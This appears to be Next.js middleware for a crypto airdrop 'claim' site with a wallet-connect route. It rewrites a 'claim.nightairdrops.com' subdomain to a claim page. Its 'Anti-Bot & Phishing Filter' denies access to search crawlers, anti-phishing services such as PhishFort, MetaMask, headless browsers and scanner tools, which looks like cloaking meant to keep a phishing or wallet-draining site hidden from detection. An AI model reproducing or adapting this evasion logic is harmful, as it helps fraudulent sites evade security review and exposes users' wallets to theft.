import { NextResponse, userAgent } from "next/server";
import type { NextRequest } from "next/server";

// Routes that require an active session cookie
const PROTECTED_ROUTES = ["/admin", "/connect-wallet"];

export function middleware(request: NextRequest) {
  const url = request.nextUrl.clone();
  const pathname = url.pathname;
  const host = (request.headers.get("host") || "").toLowerCase();
  const uaString = (request.headers.get("user-agent") || "").toLowerCase();

  // 1️⃣ Anti-Bot & Phishing Filter
  const { isBot } = userAgent(request);
  const forbiddenKeywords = [
    "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider", "yandexbot",
    "metamask", "phish", "phishfort", "scanner", "lighthouse", "headless",
    "inspect", "crawler", "spider", "python", "curl", "wget", "axios"
  ];

  const isForbiddenBot = isBot || forbiddenKeywords.some(kw => uaString.includes(kw));

  // 2️⃣ Strict Authentication Check
  const session = request.cookies.get("__session")?.value;
  const isProtectedRoute = PROTECTED_ROUTES.some(route => pathname.startsWith(route));

  // If it's a bot OR a protected route without a session, block immediately
  if (isForbiddenBot || (isProtectedRoute && !session)) {
    // Return 403 for bots/unauthorized to keep them out entirely
    return new NextResponse("Access Denied", { status: 403 });
  }

  // 3️⃣ Skip static assets (Performance)
  const isAsset =
    pathname.startsWith("/_next") ||
    pathname.match(/\.(png|jpe?g|gif|svg|ico|webp|avif|txt|xml|json)$/);

  if (isAsset) return NextResponse.next();

  // 4️⃣ Handle Claim Subdomain Rewrite
  const TARGET_DOMAIN = "claim.nightairdrops.com";
  const DESTINATION = "/claim";

  if (host === TARGET_DOMAIN) {
    if (pathname === DESTINATION || pathname.startsWith(DESTINATION + "/")) {
      return NextResponse.next();
    }
    url.pathname = DESTINATION;
    const res = NextResponse.rewrite(url);
    res.headers.set("Cache-Control", "no-store, max-age=0");
    return res;
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/((?!api|_next/static|_next/image|favicon.ico).*)"],
};